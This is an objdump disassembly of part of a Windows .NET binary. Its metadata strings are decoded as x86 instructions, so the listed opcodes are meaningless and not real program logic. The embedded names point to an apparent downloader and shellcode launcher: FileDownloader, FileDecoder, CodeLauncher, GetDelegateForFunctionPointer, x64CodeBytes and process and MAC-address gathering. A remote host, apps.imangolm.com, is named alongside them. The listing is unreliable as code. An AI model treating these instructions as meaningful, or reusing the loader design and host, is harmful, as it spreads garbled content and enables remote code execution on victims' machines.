   14000414b:	74 69                	je     0x1400041b6
   14000414d:	6f                   	outsl  (%rsi),(%dx)
   14000414e:	6e                   	outsb  (%rsi),(%dx)
   14000414f:	00 41 72             	add    %al,0x72(%rcx)
   140004152:	67 75 6d             	addr32 jne 0x1400041c2
   140004155:	65 6e                	outsb  %gs:(%rsi),(%dx)
   140004157:	74 45                	je     0x14000419e
   140004159:	78 63                	js     0x1400041be
   14000415b:	65 70 74             	gs jo  0x1400041d2
   14000415e:	69 6f 6e 00 43 6f 6d 	imul   $0x6d6f4300,0x6e(%rdi),%ebp
   140004165:	6d                   	insl   (%dx),(%rdi)
   140004166:	6f                   	outsl  (%rsi),(%dx)
   140004167:	6e                   	outsb  (%rsi),(%dx)
   140004168:	00 4d 61             	add    %cl,0x61(%rbp)
   14000416b:	6e                   	outsb  (%rsi),(%dx)
   14000416c:	67 6f                	outsl  (%esi),(%dx)
   14000416e:	50                   	push   %rax
   14000416f:	75 72                	jne    0x1400041e3
   140004171:	65 52                	gs push %rdx
   140004173:	75 6e                	jne    0x1400041e3
   140004175:	00 4c 69 63          	add    %cl,0x63(%rcx,%rbp,2)
   140004179:	65 6e                	outsb  %gs:(%rsi),(%dx)
   14000417b:	63 65 4e             	movsxd 0x4e(%rbp),%esp
   14000417e:	6f                   	outsl  (%rsi),(%dx)
   14000417f:	00 4d 65             	add    %cl,0x65(%rbp)
   140004182:	74 68                	je     0x1400041ec
   140004184:	6f                   	outsl  (%rsi),(%dx)
   140004185:	64 49 6e             	rex.WB outsb %fs:(%rsi),(%dx)
   140004188:	66 6f                	outsw  (%rsi),(%dx)
   14000418a:	00 67 65             	add    %ah,0x65(%rdi)
   14000418d:	74 5f                	je     0x1400041ee
   14000418f:	53                   	push   %rbx
   140004190:	74 61                	je     0x1400041f3
   140004192:	72 74                	jb     0x140004208
   140004194:	49 6e                	rex.WB outsb (%rsi),(%dx)
   140004196:	66 6f                	outsw  (%rsi),(%dx)
   140004198:	00 50 72             	add    %dl,0x72(%rax)
   14000419b:	6f                   	outsl  (%rsi),(%dx)
   14000419c:	63 65 73             	movsxd 0x73(%rbp),%esp
   14000419f:	73 53                	jae    0x1400041f4
   1400041a1:	74 61                	je     0x140004204
   1400041a3:	72 74                	jb     0x140004219
   1400041a5:	49 6e                	rex.WB outsb (%rsi),(%dx)
   1400041a7:	66 6f                	outsw  (%rsi),(%dx)
   1400041a9:	00 5a 65             	add    %bl,0x65(%rdx)
   1400041ac:	72 6f                	jb     0x14000421d
   1400041ae:	00 44 6f 6d          	add    %al,0x6d(%rdi,%rbp,2)
   1400041b2:	61                   	(bad)
   1400041b3:	69 6e 54 6f 49 70 00 	imul   $0x70496f,0x54(%rsi),%ebp
   1400041ba:	53                   	push   %rbx
   1400041bb:	6c                   	insb   (%dx),(%rdi)
   1400041bc:	65 65 70 00          	gs gs jo 0x1400041c0
   1400041c0:	53                   	push   %rbx
   1400041c1:	79 73                	jns    0x140004236
   1400041c3:	74 65                	je     0x14000422a
   1400041c5:	6d                   	insl   (%dx),(%rdi)
   1400041c6:	2e 4c 69 6e 71 00 46 	cs imul $0x6c694600,0x71(%rsi),%r13
   1400041cd:	69 6c 
   1400041cf:	65 44 6f             	rex.R outsl %gs:(%rsi),(%dx)
   1400041d2:	77 6e                	ja     0x140004242
   1400041d4:	6c                   	insb   (%dx),(%rdi)
   1400041d5:	6f                   	outsl  (%rsi),(%dx)
   1400041d6:	61                   	(bad)
   1400041d7:	64 65 72 00          	fs gs jb 0x1400041db
   1400041db:	46 69 6c 65 44 65 63 	imul   $0x646f6365,0x44(%rbp,%r12,2),%r13d
   1400041e2:	6f 64 
   1400041e4:	65 72 00             	gs jb  0x1400041e7
   1400041e7:	67 65 74 5f          	addr32 gs je 0x14000424a
   1400041eb:	42 75 66             	rex.X jne 0x140004254
   1400041ee:	66 65 72 00          	data16 gs jb 0x1400041f2
   1400041f2:	73 65                	jae    0x140004259
   1400041f4:	74 5f                	je     0x140004255
   1400041f6:	42 75 66             	rex.X jne 0x14000425f
   1400041f9:	66 65 72 00          	data16 gs jb 0x1400041fd
   1400041fd:	5f                   	pop    %rdi
   1400041fe:	44 6f                	rex.R outsl (%rsi),(%dx)
   140004200:	77 6e                	ja     0x140004270
   140004202:	6c                   	insb   (%dx),(%rdi)
   140004203:	6f                   	outsl  (%rsi),(%dx)
   140004204:	61                   	(bad)
   140004205:	64 42 75 66          	fs rex.X jne 0x14000426f
   140004209:	66 65 72 00          	data16 gs jb 0x14000420d
   14000420d:	47                   	rex.RXB
   14000420e:	65 74 44             	gs je  0x140004255
   140004211:	6f                   	outsl  (%rsi),(%dx)
   140004212:	77 6e                	ja     0x140004282
   140004214:	6c                   	insb   (%dx),(%rdi)
   140004215:	6f                   	outsl  (%rsi),(%dx)
   140004216:	61                   	(bad)
   140004217:	64 42 75 66          	fs rex.X jne 0x140004281
   14000421b:	66 65 72 00          	data16 gs jb 0x14000421f
   14000421f:	43 61                	rex.XB (bad)
   140004221:	63 68 65             	movsxd 0x65(%rax),%ebp
   140004224:	42 75 66             	rex.X jne 0x14000428d
   140004227:	66 65 72 00          	data16 gs jb 0x14000422b
   14000422b:	45 6e                	rex.RB outsb (%rsi),(%dx)
   14000422d:	63 72 79             	movsxd 0x79(%rdx),%esi
   140004230:	70 74                	jo     0x1400042a6
   140004232:	46 69 6c 65 42 75 66 	imul   $0x65666675,0x42(%rbp,%r12,2),%r13d
   140004239:	66 65 
   14000423b:	72 00                	jb     0x14000423d
   14000423d:	62 75 66 66 65       	(bad)
   140004242:	72 00                	jb     0x140004244
   140004244:	43 6f                	rex.XB outsl (%rsi),(%dx)
   140004246:	64 65 4c 61          	fs gs rex.WR (bad)
   14000424a:	75 6e                	jne    0x1400042ba
   14000424c:	63 68 65             	movsxd 0x65(%rax),%ebp
   14000424f:	72 00                	jb     0x140004251
   140004251:	63 6f 64             	movsxd 0x64(%rdi),%ebp
   140004254:	65 50                	gs push %rax
   140004256:	6f                   	outsl  (%rsi),(%dx)
   140004257:	69 6e 74 65 72 00 47 	imul   $0x47007265,0x74(%rsi),%ebp
   14000425e:	65 74 44             	gs je  0x1400042a5
   140004261:	65 6c                	gs insb (%dx),(%rdi)
   140004263:	65 67 61             	gs addr32 (bad)
   140004266:	74 65                	je     0x1400042cd
   140004268:	46 6f                	rex.RX outsl (%rsi),(%dx)
   14000426a:	72 46                	jb     0x1400042b2
   14000426c:	75 6e                	jne    0x1400042dc
   14000426e:	63 74 69 6f          	movsxd 0x6f(%rcx,%rbp,2),%esi
   140004272:	6e                   	outsb  (%rsi),(%dx)
   140004273:	50                   	push   %rax
   140004274:	6f                   	outsl  (%rsi),(%dx)
   140004275:	69 6e 74 65 72 00 42 	imul   $0x42007265,0x74(%rsi),%ebp
   14000427c:	69 74 43 6f 6e 76 65 	imul   $0x7265766e,0x6f(%rbx,%rax,2),%esi
   140004283:	72 
   140004284:	74 65                	je     0x1400042eb
   140004286:	72 00                	jb     0x140004288
   140004288:	5f                   	pop    %rdi
   140004289:	53                   	push   %rbx
   14000428a:	65 72 76             	gs jb  0x140004303
   14000428d:	65 72 00             	gs jb  0x140004290
   140004290:	54                   	push   %rsp
   140004291:	6f                   	outsl  (%rsi),(%dx)
   140004292:	4c 6f                	rex.WR outsl (%rsi),(%dx)
   140004294:	77 65                	ja     0x1400042fb
   140004296:	72 00                	jb     0x140004298
   140004298:	52                   	push   %rdx
   140004299:	65 6d                	gs insl (%dx),(%rdi)
   14000429b:	6f                   	outsl  (%rsi),(%dx)
   14000429c:	74 65                	je     0x140004303
   14000429e:	43 6c                	rex.XB insb (%dx),(%rdi)
   1400042a0:	69 65 6e 74 47 75 69 	imul   $0x69754774,0x6e(%rbp),%esp
   1400042a7:	64 47                	fs rex.RXB
   1400042a9:	65 6e                	outsb  %gs:(%rsi),(%dx)
   1400042ab:	65 72 61             	gs jb  0x14000430f
   1400042ae:	74 6f                	je     0x14000431f
   1400042b0:	72 00                	jb     0x1400042b2
   1400042b2:	2e 63 74 6f 72       	cs movsxd 0x72(%rdi,%rbp,2),%esi
   1400042b7:	00 2e                	add    %ch,(%rsi)
   1400042b9:	63 63 74             	movsxd 0x74(%rbx),%esp
   1400042bc:	6f                   	outsl  (%rsi),(%dx)
   1400042bd:	72 00                	jb     0x1400042bf
   1400042bf:	55                   	push   %rbp
   1400042c0:	49 6e                	rex.WB outsb (%rsi),(%dx)
   1400042c2:	74 50                	je     0x140004314
   1400042c4:	74 72                	je     0x140004338
   1400042c6:	00 53 79             	add    %dl,0x79(%rbx)
   1400042c9:	73 74                	jae    0x14000433f
   1400042cb:	65 6d                	gs insl (%dx),(%rdi)
   1400042cd:	2e 44 69 61 67 6e 6f 	cs imul $0x74736f6e,0x67(%rcx),%r12d
   1400042d4:	73 74 
   1400042d6:	69 63 73 00 47 65 74 	imul   $0x74654700,0x73(%rbx),%esp
   1400042dd:	41 6c                	rex.B insb (%dx),(%rdi)
   1400042df:	6c                   	insb   (%dx),(%rdi)
   1400042e0:	4e                   	rex.WRX
   1400042e1:	65 74 77             	gs je  0x14000435b
   1400042e4:	6f                   	outsl  (%rsi),(%dx)
   1400042e5:	72 6b                	jb     0x140004352
   1400042e7:	49 6e                	rex.WB outsb (%rsi),(%dx)
   1400042e9:	74 65                	je     0x140004350
   1400042eb:	72 66                	jb     0x140004353
   1400042ed:	61                   	(bad)
   1400042ee:	63 65 73             	movsxd 0x73(%rbp),%esp
   1400042f1:	00 53 79             	add    %dl,0x79(%rbx)
   1400042f4:	73 74                	jae    0x14000436a
   1400042f6:	65 6d                	gs insl (%dx),(%rdi)
   1400042f8:	2e 52                	cs push %rdx
   1400042fa:	75 6e                	jne    0x14000436a
   1400042fc:	74 69                	je     0x140004367
   1400042fe:	6d                   	insl   (%dx),(%rdi)
   1400042ff:	65 2e 49 6e          	gs rex.WB outsb %gs:(%rsi),(%dx)
   140004303:	74 65                	je     0x14000436a
   140004305:	72 6f                	jb     0x140004376
   140004307:	70 53                	jo     0x14000435c
   140004309:	65 72 76             	gs jb  0x140004382
   14000430c:	69 63 65 73 00 53 79 	imul   $0x79530073,0x65(%rbx),%esp
   140004313:	73 74                	jae    0x140004389
   140004315:	65 6d                	gs insl (%dx),(%rdi)
   140004317:	2e 52                	cs push %rdx
   140004319:	75 6e                	jne    0x140004389
   14000431b:	74 69                	je     0x140004386
   14000431d:	6d                   	insl   (%dx),(%rdi)
   14000431e:	65 2e 43 6f          	gs rex.XB outsl %gs:(%rsi),(%dx)
   140004322:	6d                   	insl   (%dx),(%rdi)
   140004323:	70 69                	jo     0x14000438e
   140004325:	6c                   	insb   (%dx),(%rdi)
   140004326:	65 72 53             	gs jb  0x14000437c
   140004329:	65 72 76             	gs jb  0x1400043a2
   14000432c:	69 63 65 73 00 44 65 	imul   $0x65440073,0x65(%rbx),%esp
   140004333:	62 75 67 67 69       	(bad)
   140004338:	6e                   	outsb  (%rsi),(%dx)
   140004339:	67 4d 6f             	rex.WRB outsl (%esi),(%dx)
   14000433c:	64 65 73 00          	fs gs jae 0x140004340
   140004340:	47                   	rex.RXB
   140004341:	65 74 49             	gs je  0x14000438d
   140004344:	50                   	push   %rax
   140004345:	50                   	push   %rax
   140004346:	72 6f                	jb     0x1400043b7
   140004348:	70 65                	jo     0x1400043af
   14000434a:	72 74                	jb     0x1400043c0
   14000434c:	69 65 73 00 49 50 49 	imul   $0x49504900,0x73(%rbp),%esp
   140004353:	6e                   	outsb  (%rsi),(%dx)
   140004354:	74 65                	je     0x1400043bb
   140004356:	72 66                	jb     0x1400043be
   140004358:	61                   	(bad)
   140004359:	63 65 50             	movsxd 0x50(%rbp),%esp
   14000435c:	72 6f                	jb     0x1400043cd
   14000435e:	70 65                	jo     0x1400043c5
   140004360:	72 74                	jb     0x1400043d6
   140004362:	69 65 73 00 47 65 74 	imul   $0x74654700,0x73(%rbp),%esp
   140004369:	50                   	push   %rax
   14000436a:	72 6f                	jb     0x1400043db
   14000436c:	63 65 73             	movsxd 0x73(%rbp),%esp
   14000436f:	73 65                	jae    0x1400043d6
   140004371:	73 00                	jae    0x140004373
   140004373:	47                   	rex.RXB
   140004374:	65 74 48             	gs je  0x1400043bf
   140004377:	6f                   	outsl  (%rsi),(%dx)
   140004378:	73 74                	jae    0x1400043ee
   14000437a:	41                   	rex.B
   14000437b:	64 64 72 65          	fs fs jb 0x1400043e4
   14000437f:	73 73                	jae    0x1400043f4
   140004381:	65 73 00             	gs jae 0x140004384
   140004384:	78 36                	js     0x1400043bc
   140004386:	34 43                	xor    $0x43,%al
   140004388:	6f                   	outsl  (%rsi),(%dx)
   140004389:	64 65 42 79 74       	fs gs rex.X jns 0x140004402
   14000438e:	65 73 00             	gs jae 0x140004391
   140004391:	78 38                	js     0x1400043cb
   140004393:	36 43 6f             	ss rex.XB outsl (%rsi),(%dx)
   140004396:	64 65 42 79 74       	fs gs rex.X jns 0x14000440f
   14000439b:	65 73 00             	gs jae 0x14000439e
   14000439e:	47                   	rex.RXB
   14000439f:	65 74 42             	gs je  0x1400043e4
   1400043a2:	79 74                	jns    0x140004418
   1400043a4:	65 73 00             	gs jae 0x1400043a7
   1400043a7:	61                   	(bad)
   1400043a8:	72 67                	jb     0x140004411
   1400043aa:	73 00                	jae    0x1400043ac
   1400043ac:	53                   	push   %rbx
   1400043ad:	79 73                	jns    0x140004422
   1400043af:	74 65                	je     0x140004416
   1400043b1:	6d                   	insl   (%dx),(%rdi)
   1400043b2:	2e 54                	cs push %rsp
   1400043b4:	68 72 65 61 64       	push   $0x64616572
   1400043b9:	69 6e 67 2e 54 61 73 	imul   $0x7361542e,0x67(%rsi),%ebp
   1400043c0:	6b 73 00 44          	imul   $0x44,0x0(%rbx),%esi
   1400043c4:	6e                   	outsb  (%rsi),(%dx)
   1400043c5:	73 00                	jae    0x1400043c7
   1400043c7:	43 6f                	rex.XB outsl (%rsi),(%dx)
   1400043c9:	6e                   	outsb  (%rsi),(%dx)
   1400043ca:	74 61                	je     0x14000442d
   1400043cc:	69 6e 73 00 67 65 74 	imul   $0x74656700,0x73(%rsi),%ebp
   1400043d3:	5f                   	pop    %rdi
   1400043d4:	43 68 61 72 73 00    	rex.XB push $0x737261
   1400043da:	52                   	push   %rdx
   1400043db:	75 6e                	jne    0x14000444b
   1400043dd:	74 69                	je     0x140004448
   1400043df:	6d                   	insl   (%dx),(%rdi)
   1400043e0:	65 48                	gs rex.W
   1400043e2:	65 6c                	gs insb (%dx),(%rdi)
   1400043e4:	70 65                	jo     0x14000444b
   1400043e6:	72 73                	jb     0x14000445b
   1400043e8:	00 4d 61             	add    %cl,0x61(%rbp)
   1400043eb:	6e                   	outsb  (%rsi),(%dx)
   1400043ec:	67 6f                	outsl  (%esi),(%dx)
   1400043ee:	47 75 61             	rex.RXB jne 0x140004452
   1400043f1:	72 64                	jb     0x140004457
   1400043f3:	50                   	push   %rax
   1400043f4:	72 6f                	jb     0x140004465
   1400043f6:	63 65 73             	movsxd 0x73(%rbp),%esp
   1400043f9:	73 00                	jae    0x1400043fb
   1400043fb:	47                   	rex.RXB
   1400043fc:	65 74 43             	gs je  0x140004442
   1400043ff:	75 72                	jne    0x140004473
   140004401:	72 65                	jb     0x140004468
   140004403:	6e                   	outsb  (%rsi),(%dx)
   140004404:	74 50                	je     0x140004456
   140004406:	72 6f                	jb     0x140004477
   140004408:	63 65 73             	movsxd 0x73(%rbp),%esp
   14000440b:	73 00                	jae    0x14000440d
   14000440d:	47                   	rex.RXB
   14000440e:	65 74 4d             	gs je  0x14000445e
   140004411:	41                   	rex.B
   140004412:	43                   	rex.XB
   140004413:	41                   	rex.B
   140004414:	64 64 72 65          	fs fs jb 0x14000447d
   140004418:	73 73                	jae    0x14000448d
   14000441a:	00 49 50             	add    %cl,0x50(%rcx)
   14000441d:	41                   	rex.B
   14000441e:	64 64 72 65          	fs fs jb 0x140004487
   140004422:	73 73                	jae    0x140004497
   140004424:	00 47 65             	add    %al,0x65(%rdi)
   140004427:	74 50                	je     0x140004479
   140004429:	68 79 73 69 63       	push   $0x63697379
   14000442e:	61                   	(bad)
   14000442f:	6c                   	insb   (%dx),(%rdi)
   140004430:	41                   	rex.B
   140004431:	64 64 72 65          	fs fs jb 0x14000449a
   140004435:	73 73                	jae    0x1400044aa
   140004437:	00 6c 70 41          	add    %ch,0x41(%rax,%rsi,2)
   14000443b:	64 64 72 65          	fs fs jb 0x1400044a4
   14000443f:	73 73                	jae    0x1400044b4
   140004441:	00 53 79             	add    %dl,0x79(%rbx)
   140004444:	73 74                	jae    0x1400044ba
   140004446:	65 6d                	gs insl (%dx),(%rdi)
   140004448:	2e 4e                	cs rex.WRX
   14000444a:	65 74 2e             	gs je  0x14000447b
   14000444d:	53                   	push   %rbx
   14000444e:	6f                   	outsl  (%rsi),(%dx)
   14000444f:	63 6b 65             	movsxd 0x65(%rbx),%ebp
   140004452:	74 73                	je     0x1400044c7
   140004454:	00 73 65             	add    %dh,0x65(%rbx)
   140004457:	74 5f                	je     0x1400044b8
   140004459:	41 72 67             	rex.B jb 0x1400044c3
   14000445c:	75 6d                	jne    0x1400044cb
   14000445e:	65 6e                	outsb  %gs:(%rsi),(%dx)
   140004460:	74 73                	je     0x1400044d5
   140004462:	00 43 6f             	add    %al,0x6f(%rbx)
   140004465:	6e                   	outsb  (%rsi),(%dx)
   140004466:	63 61 74             	movsxd 0x74(%rcx),%esp
   140004469:	00 46 6f             	add    %al,0x6f(%rsi)
   14000446c:	72 6d                	jb     0x1400044db
   14000446e:	61                   	(bad)
   14000446f:	74 00                	je     0x140004471
   140004471:	4d 61                	rex.WRB (bad)
   140004473:	72 73                	jb     0x1400044e8
   140004475:	68 61 6c 42 79       	push   $0x79426c61
   14000447a:	52                   	push   %rdx
   14000447b:	65 66 4f 62 6a 65 63 	(bad)
   140004482:	74 
   140004483:	00 6f 62             	add    %ch,0x62(%rdi)
   140004486:	6a 65                	push   $0x65
   140004488:	63 74 00 42          	movsxd 0x42(%rax,%rax,1),%esi
   14000448c:	65 67 69 6e 43 6f 6e 	imul   $0x656e6e6f,%gs:0x43(%esi),%ebp
   140004493:	6e 65 
   140004495:	63 74 00 66          	movsxd 0x66(%rax,%rax,1),%esi
   140004499:	6c                   	insb   (%dx),(%rdi)
   14000449a:	50                   	push   %rax
   14000449b:	72 6f                	jb     0x14000450c
   14000449d:	74 65                	je     0x140004504
   14000449f:	63 74 00 53          	movsxd 0x53(%rax,%rax,1),%esi
   1400044a3:	79 73                	jns    0x140004518
   1400044a5:	74 65                	je     0x14000450c
   1400044a7:	6d                   	insl   (%dx),(%rdi)
   1400044a8:	2e 4e                	cs rex.WRX
   1400044aa:	65 74 00             	gs je  0x1400044ad
   1400044ad:	53                   	push   %rbx
   1400044ae:	65 74 00             	gs je  0x1400044b1
   1400044b1:	53                   	push   %rbx
   1400044b2:	6f                   	outsl  (%rsi),(%dx)
   1400044b3:	63 6b 65             	movsxd 0x65(%rbx),%ebp
   1400044b6:	74 00                	je     0x1400044b8
   1400044b8:	4f                   	rex.WRXB
   1400044b9:	66 66 73 65          	data16 data16 jae 0x140004522
   1400044bd:	74 00                	je     0x1400044bf
   1400044bf:	57                   	push   %rdi
   1400044c0:	61                   	(bad)
   1400044c1:	69 74 00 57 61 69 74 	imul   $0x46746961,0x57(%rax,%rax,1),%esi
   1400044c8:	46 
   1400044c9:	6f                   	outsl  (%rsi),(%dx)
   1400044ca:	72 45                	jb     0x140004511
   1400044cc:	78 69                	js     0x140004537
   1400044ce:	74 00                	je     0x1400044d0
   1400044d0:	49                   	rex.WB
   1400044d1:	41 73 79             	rex.B jae 0x14000454d
   1400044d4:	6e                   	outsb  (%rsi),(%dx)
   1400044d5:	63 52 65             	movsxd 0x65(%rdx),%edx
   1400044d8:	73 75                	jae    0x14000454f
   1400044da:	6c                   	insb   (%dx),(%rdi)
   1400044db:	74 00                	je     0x1400044dd
   1400044dd:	72 65                	jb     0x140004544
   1400044df:	73 75                	jae    0x140004556
   1400044e1:	6c                   	insb   (%dx),(%rdi)
   1400044e2:	74 00                	je     0x1400044e4
   1400044e4:	45 6e                	rex.RB outsb (%rsi),(%dx)
   1400044e6:	76 69                	jbe    0x140004551
   1400044e8:	72 6f                	jb     0x140004559
   1400044ea:	6e                   	outsb  (%rsi),(%dx)
   1400044eb:	6d                   	insl   (%dx),(%rdi)
   1400044ec:	65 6e                	outsb  %gs:(%rsi),(%dx)
   1400044ee:	74 00                	je     0x1400044f0
   1400044f0:	50                   	push   %rax
   1400044f1:	61                   	(bad)
   1400044f2:	63 6b 65             	movsxd 0x65(%rbx),%ebp
   1400044f5:	74 46                	je     0x14000453d
   1400044f7:	69 6c 65 43 6f 6e 74 	imul   $0x65746e6f,0x43(%rbp,%riz,2),%ebp
   1400044fe:	65 
   1400044ff:	6e                   	outsb  (%rsi),(%dx)
   140004500:	74 00                	je     0x140004502
   140004502:	5f                   	pop    %rdi
   140004503:	52                   	push   %rdx
   140004504:	65 63 76 44          	movsxd %gs:0x44(%rsi),%esi
   140004508:	6f                   	outsl  (%rsi),(%dx)
   140004509:	6e                   	outsb  (%rsi),(%dx)
   14000450a:	65 45 76 65          	gs rex.RB jbe 0x140004573
   14000450e:	6e                   	outsb  (%rsi),(%dx)
   14000450f:	74 00                	je     0x140004511
   140004511:	41 75 74             	rex.B jne 0x140004588
   140004514:	6f                   	outsl  (%rsi),(%dx)
   140004515:	52                   	push   %rdx
   140004516:	65 73 65             	gs jae 0x14000457e
   140004519:	74 45                	je     0x140004560
   14000451b:	76 65                	jbe    0x140004582
   14000451d:	6e                   	outsb  (%rsi),(%dx)
   14000451e:	74 00                	je     0x140004520
   140004520:	67 65 74 5f          	addr32 gs je 0x140004583
   140004524:	45 6e                	rex.RB outsb (%rsi),(%dx)
   140004526:	74 72                	je     0x14000459a
   140004528:	79 50                	jns    0x14000457a
   14000452a:	6f                   	outsl  (%rsi),(%dx)
   14000452b:	69 6e 74 00 53 74 61 	imul   $0x61745300,0x74(%rsi),%ebp
   140004532:	72 74                	jb     0x1400045a8
   140004534:	00 50 6f             	add    %dl,0x6f(%rax)
   140004537:	72 74                	jb     0x1400045ad
   140004539:	00 53 65             	add    %dl,0x65(%rbx)
   14000453c:	6e                   	outsb  (%rsi),(%dx)
   14000453d:	64 52                	fs push %rdx
   14000453f:	65 71 75             	gs jno 0x1400045b7
   140004542:	65 73 74             	gs jae 0x1400045b9
   140004545:	00 54 6f 4c          	add    %dl,0x4c(%rdi,%rbp,2)
   140004549:	69 73 74 00 4e 65 78 	imul   $0x78654e00,0x74(%rbx),%esi
   140004550:	74 00                	je     0x140004552
   140004552:	53                   	push   %rbx
   140004553:	79 73                	jns    0x1400045c8
   140004555:	74 65                	je     0x1400045bc
   140004557:	6d                   	insl   (%dx),(%rdi)
   140004558:	2e 54                	cs push %rsp
   14000455a:	65 78 74             	gs js  0x1400045d1
   14000455d:	00 47 75             	add    %al,0x75(%rdi)
   140004560:	69 64 54 65 78 74 00 	imul   $0x41007478,0x65(%rsp,%rdx,2),%esp
   140004567:	41 
   140004568:	73 79                	jae    0x1400045e3
   14000456a:	6e                   	outsb  (%rsi),(%dx)
   14000456b:	63 52 65             	movsxd 0x65(%rdx),%edx
   14000456e:	63 76 00             	movsxd 0x0(%rsi),%esi
   140004571:	5f                   	pop    %rdi
   140004572:	68 52 65 63 76       	push   $0x76636552
   140004577:	00 53 74             	add    %dl,0x74(%rbx)
   14000457a:	61                   	(bad)
   14000457b:	72 74                	jb     0x1400045f1
   14000457d:	4e                   	rex.WRX
   14000457e:	65 77 00             	gs ja  0x140004581
   140004581:	73 65                	jae    0x1400045e8
   140004583:	74 5f                	je     0x1400045e4
   140004585:	43 72 65             	rex.XB jb 0x1400045ed
   140004588:	61                   	(bad)
   140004589:	74 65                	je     0x1400045f0
   14000458b:	4e 6f                	rex.WRX outsl (%rsi),(%dx)
   14000458d:	57                   	push   %rdi
   14000458e:	69 6e 64 6f 77 00 49 	imul   $0x4900776f,0x64(%rsi),%ebp
   140004595:	6e                   	outsb  (%rsi),(%dx)
   140004596:	69 74 69 61 6c 69 7a 	imul   $0x657a696c,0x61(%rcx,%rbp,2),%esi
   14000459d:	65 
   14000459e:	41 72 72             	rex.B jb 0x140004613
   1400045a1:	61                   	(bad)
   1400045a2:	79 00                	jns    0x1400045a4
   1400045a4:	41 73 73             	rex.B jae 0x14000461a
   1400045a7:	65 6d                	gs insl (%dx),(%rdi)
   1400045a9:	62 6c 79 00 41       	(bad)
   1400045ae:	64 64 72 65          	fs fs jb 0x140004617
   1400045b2:	73 73                	jae    0x140004627
   1400045b4:	46 61                	rex.RX (bad)
   1400045b6:	6d                   	insl   (%dx),(%rdi)
   1400045b7:	69 6c 79 00 41 6e 79 	imul   $0x796e41,0x0(%rcx,%rdi,2),%ebp
   1400045be:	00 
   1400045bf:	43 6f                	rex.XB outsl (%rsi),(%dx)
   1400045c1:	70 79                	jo     0x14000463c
   1400045c3:	00 67 65             	add    %ah,0x65(%rdi)
   1400045c6:	74 5f                	je     0x140004627
   1400045c8:	46 61                	rex.RX (bad)
   1400045ca:	63 74 6f 72          	movsxd 0x72(%rdi,%rbp,2),%esi
   1400045ce:	79 00                	jns    0x1400045d0
   1400045d0:	54                   	push   %rsp
   1400045d1:	61                   	(bad)
   1400045d2:	73 6b                	jae    0x14000463f
   1400045d4:	46 61                	rex.RX (bad)
   1400045d6:	63 74 6f 72          	movsxd 0x72(%rdi,%rbp,2),%esi
   1400045da:	79 00                	jns    0x1400045dc
   1400045dc:	6f                   	outsl  (%rsi),(%dx)
   1400045dd:	70 5f                	jo     0x14000463e
   1400045df:	45 71 75             	rex.RB jno 0x140004657
   1400045e2:	61                   	(bad)
   1400045e3:	6c                   	insb   (%dx),(%rdi)
   1400045e4:	69 74 79 00 6f 70 5f 	imul   $0x495f706f,0x0(%rcx,%rdi,2),%esi
   1400045eb:	49 
   1400045ec:	6e                   	outsb  (%rsi),(%dx)
   1400045ed:	65 71 75             	gs jno 0x140004665
   1400045f0:	61                   	(bad)
   1400045f1:	6c                   	insb   (%dx),(%rdi)
   1400045f2:	69 74 79 00 45 6d 70 	imul   $0x74706d45,0x0(%rcx,%rdi,2),%esi
   1400045f9:	74 
   1400045fa:	79 00                	jns    0x1400045fc
   1400045fc:	00 23                	add    %ah,(%rbx)
   1400045fe:	61                   	(bad)
   1400045ff:	00 70 00             	add    %dh,0x0(%rax)
   140004602:	70 00                	jo     0x140004604
   140004604:	73 00                	jae    0x140004606
   140004606:	2e 00 69 00          	cs add %ch,0x0(%rcx)
   14000460a:	6d                   	insl   (%dx),(%rdi)
   14000460b:	00 61 00             	add    %ah,0x0(%rcx)
   14000460e:	6e                   	outsb  (%rsi),(%dx)
   14000460f:	00 67 00             	add    %ah,0x0(%rdi)
   140004612:	6f                   	outsl  (%rsi),(%dx)
   140004613:	00 6c 00 6d          	add    %ch,0x6d(%rax,%rax,1)
   140004617:	00 2e                	add    %ch,(%rsi)
   140004619:	00 63 00             	add    %ah,0x0(%rbx)
   14000461c:	6f                   	outsl  (%rsi),(%dx)
   14000461d:	00 6d 00             	add    %ch,0x0(%rbp)
   140004620:	00 01                	add    %al,(%rcx)
   140004622:	00 1d 54 00 69 00    	add    %bl,0x690054(%rip)        # 0x14069467c
   140004628:	66 00 61 00          	data16 add %ah,0x0(%rcx)
   14000462c:	2e 00 49 00          	cs add %cl,0x0(%rcx)
   140004630:	6e                   	outsb  (%rsi),(%dx)
   140004631:	00 73 00             	add    %dh,0x0(%rbx)
   140004634:	74 00                	je     0x140004636
   140004636:	61                   	(bad)
   140004637:	00 6c 00 6c          	add    %ch,0x6c(%rax,%rax,1)
   14000463b:	00 65 00             	add    %ah,0x0(%rbp)
   14000463e:	72 00                	jb     0x140004640
   140004640:	00 05 2d 00 67 00    	add    %al,0x67002d(%rip)        # 0x140674673
   140004646:	01 05 2d 00 70 00    	add    %eax,0x70002d(%rip)        # 0x140704679
   14000464c:	01 11                	add    %edx,(%rcx)
   14000464e:	4b 00 4d 00          	rex.WXB add %cl,0x0(%r13)
   140004652:	53                   	push   %rbx
   140004653:	00 54 00 6f          	add    %dl,0x6f(%rax,%rax,1)
   140004657:	00 6f 00             	add    %ch,0x0(%rdi)
   14000465a:	6c                   	insb   (%dx),(%rdi)
   14000465b:	00 73 00             	add    %dh,0x0(%rbx)
   14000465e:	00 19                	add    %bl,(%rcx)
   140004660:	41 00 67 00          	add    %spl,0x0(%r15)
   140004664:	65 00 6e 00          	add    %ch,%gs:0x0(%rsi)
   140004668:	74 00                	je     0x14000466a
   14000466a:	49 00 6e 00          	rex.WB add %bpl,0x0(%r14)
   14000466e:	73 00                	jae    0x140004670
   140004670:	74 00                	je     0x140004672
   140004672:	61                   	(bad)
   140004673:	00 6c 00 6c          	add    %ch,0x6c(%rax,%rax,1)
   140004677:	00 00                	add    %al,(%rax)
   140004679:	11 32                	adc    %esi,(%rdx)
   14000467b:	00 30                	add    %dh,(%rax)
   14000467d:	00 32                	add    %dh,(%rdx)
   14000467f:	00 31                	add    %dh,(%rcx)
   140004681:	00 31                	add    %dh,(%rcx)
   140004683:	00 32                	add    %dh,(%rdx)
   140004685:	00 31                	add    %dh,(%rcx)
   140004687:	00 36                	add    %dh,(%rsi)
   140004689:	00 00                	add    %al,(%rax)
   14000468b:	80 93 7b 00 7b 00 22 	adcb   $0x22,0x7b007b(%rbx)
   140004692:	00 43 00             	add    %al,0x0(%rbx)
   140004695:	6f                   	outsl  (%rsi),(%dx)
   140004696:	00 6d 00             	add    %ch,0x0(%rbp)
   140004699:	70 00                	jo     0x14000469b
   14000469b:	75 00                	jne    0x14000469d
   14000469d:	74 00                	je     0x14000469f
